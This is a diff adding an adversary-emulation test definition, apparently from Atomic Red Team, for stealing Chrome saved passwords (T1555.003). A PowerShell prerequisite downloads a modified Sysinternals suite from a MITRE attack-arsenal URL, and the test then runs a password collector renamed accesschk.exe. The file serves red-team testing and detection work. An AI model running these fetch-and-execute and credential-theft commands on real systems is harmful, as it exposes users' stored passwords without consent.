@@ -1,0 +1,37 @@
+{
+    "name": "Run Chrome-password Collector",
+    "description": "A modified sysinternals suite will be downloaded and staged. The Chrome-password collector, renamed accesschk.exe, will then be executed from #{file_path}.  Successful execution will produce stdout message stating Copying db ... passwordsDB DB Opened. statement prepare DB connection closed properly. Upon completion, final output will be a file modification of PathToAtomicsFolder\\..\\ExternalPayloads\\sysinternals\\passwordsdb.  Adapted from [MITRE ATTACK Evals](https://github.com/mitre-attack/attack-arsenal/blob/66650cebd33b9a1e180f7b31261da1789cdceb66/adversary_emulation/APT29/CALDERA_DIY/evals/data/abilities/credential-access/e7cab9bb-3e3a-4d93-99cc-3593c1dc8c6d.yml) ",
+    "supported_platforms": [
+        "windows"
+    ],
+    "dependency_executor_name": "powershell",
+    "executor": {
+        "command": "Set-Location -path \"#{file_path}\\Sysinternals\";\n./accesschk.exe -accepteula .;\n",
+        "cleanup_command": "Remove-Item \"#{file_path}\\Sysinternals\" -Force -Recurse -ErrorAction Ignore\n",
+        "name": "powershell",
+        "type": "Command Executor"
+    },
+    "id": "T1555.003",
+    "tactics": [
+        "Credential Access"
+    ],
+    "technique": "Credentials from Web Browsers",
+    "source": "ART",
+    "uuid": "8c05b133-d438-47ca-a630-19cc464c4622",
+    "arguments": {
+        "file_path": {
+            "description": "File path for modified Sysinternals",
+            "type": "string",
+            "default": "PathToAtomicsFolder\\..\\ExternalPayloads"
+        }
+    },
+    "preconditions": [
+        {
+            "description": "Modified Sysinternals must be located at #{file_path}\n",
+            "prereq_command": "if (Test-Path \"#{file_path}\\SysInternals\") {exit 0} else {exit 1}\n",
+            "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction ignore -Force | Out-Null\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nInvoke-WebRequest \"https://github.com/mitre-attack/attack-arsenal/raw/66650cebd33b9a1e180f7b31261da1789cdceb66/adversary_emulation/APT29/CALDERA_DIY/evals/payloads/Modified-SysInternalsSuite.zip\" -OutFile \"#{file_path}\\Modified-SysInternalsSuite.zip\"\nExpand-Archive \"#{file_path}\\Modified-SysInternalsSuite.zip\" \"#{file_path}\\sysinternals\" -Force\nRemove-Item \"#{file_path}\\Modified-SysInternalsSuite.zip\" -Force\n"
+        }
+    ],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
